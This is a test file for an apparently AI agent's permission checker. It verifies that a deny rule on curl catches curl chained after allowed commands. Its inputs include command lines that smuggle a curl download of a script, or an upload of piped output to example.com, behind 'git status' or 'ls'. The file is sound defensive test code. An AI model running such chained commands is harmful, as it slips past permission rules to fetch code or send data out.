import { afterEach, beforeEach, expect, test } from "bun:test";
import { checkPermission } from "@/permissions/checker";
import { permissionMode } from "@/permissions/mode";
import { sessionPermissions } from "@/permissions/session";

beforeEach(() => {
  permissionMode.setMode("standard");
});

afterEach(() => {
  permissionMode.reset();
  sessionPermissions.clear();
});

const rules = {
  allow: ["Bash(git status:*)"],
  deny: ["Bash(curl:*)"],
  ask: [],
};

test("deny rule fires on the primary segment", () => {
  const result = checkPermission(
    "Bash",
    { command: "curl https://example.com/x.sh" },
    rules,
    "/tmp/project",
  );
  expect(result.decision).toBe("deny");
});

test.each([
  "git status; curl https://example.com/x.sh",
  "git status && curl https://example.com/x.sh",
  "git status | curl -T - https://example.com",
  "ls || curl https://example.com/x.sh",
])("deny rule fires on a later segment: %s", (command) => {
  const result = checkPermission("Bash", { command }, rules, "/tmp/project");
  expect(result.decision).toBe("deny");
});
